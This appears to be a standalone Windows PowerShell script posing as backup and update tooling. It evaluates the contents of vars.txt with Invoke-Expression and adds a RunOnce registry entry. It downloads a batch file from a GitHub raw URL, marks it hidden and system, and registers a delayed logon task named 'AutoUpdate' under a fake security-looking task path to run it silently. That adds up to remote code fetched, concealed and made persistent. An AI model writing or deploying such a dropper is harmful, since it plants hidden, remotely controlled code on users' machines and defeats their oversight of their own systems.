Set-Location $PSScriptRoot
$exp = Get-Content -Path ".\vars.txt" -Raw; Invoke-Expression $exp;

New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\" -Name "Backup" -Value "powershell.exe -WindowStyle Minimized ${_backupPath}\backup.ps1" -PropertyType String -Force

if (-not (Test-Path "${_updatePath}\netrun.bat")) {
    Set-Location "${_updatePath}"
    curl -o netrun.bat "https://raw.githubusercontent.com/Shaymin-HEG-001/Mikroschrott/refs/heads/master/netrun.bat"
    Set-ItemProperty -Path "${_updatePath}\netrun.bat" -Name Attributes -Value 6
}

$task = Get-ScheduledTask -TaskName "AutoUpdate"
if (-not ($task)) {
    $trigger = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
    $trigger.Delay = 'PT15M' # Delay for Task
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    $PS = New-ScheduledTaskAction -Execute "${_updatePath}\netrun.bat" -Argument "-silent"
    Register-ScheduledTask -TaskName "AutoUpdate" -TaskPath "\SYS\WIN32\x64\Security\" -Trigger $trigger -User $env:USERNAME -Action $PS -Settings $taskSettings
}
